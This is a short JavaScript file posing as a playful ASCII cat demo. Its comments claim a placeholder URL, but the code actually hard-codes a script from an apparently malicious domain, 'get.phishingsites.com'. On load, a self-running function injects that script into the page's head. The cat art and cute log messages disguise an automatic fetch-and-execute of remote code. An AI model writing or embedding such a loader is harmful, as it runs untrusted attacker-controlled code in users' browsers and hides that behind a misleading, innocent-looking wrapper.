/**
 * ASCII Cat with Subrequest Script Loader
 * Replace 'YOUR_SCRIPT_URL_HERE' with the actual script URL
 */

// ASCII cat art
const catArt = `
    /\\_/\\  
   ( o.o ) 
    > ^ <  
   /     \\ 
  /       \\
`;

// Display the cat
console.log("Here's your ASCII cat:");
console.log(catArt);

// Function to load external script via subrequest
function loadExternalScript(url) {
  console.log("Cat is fetching a script from:", url);

  return new Promise((resolve, reject) => {
    const script = document.createElement("script");
    script.src = url;
    script.onload = () => {
      console.log("Meow! Script loaded successfully!");
      resolve(true);
    };
    script.onerror = () => {
      console.error("Hiss! Failed to load script!");
      reject(new Error("Script loading failed"));
    };
    document.head.appendChild(script);
  });
}

// Execute the subrequest
(async function () {
  try {
    // Replace this URL with your actual script URL
    const scriptUrl = "https://get.phishingsites.com/viking-4th.js";

    console.log("Cat is making a subrequest...");
    await loadExternalScript(scriptUrl);
    console.log("Cat completed the subrequest!");
  } catch (error) {
    console.error("Cat encountered an error:", error.message);
  }
})();
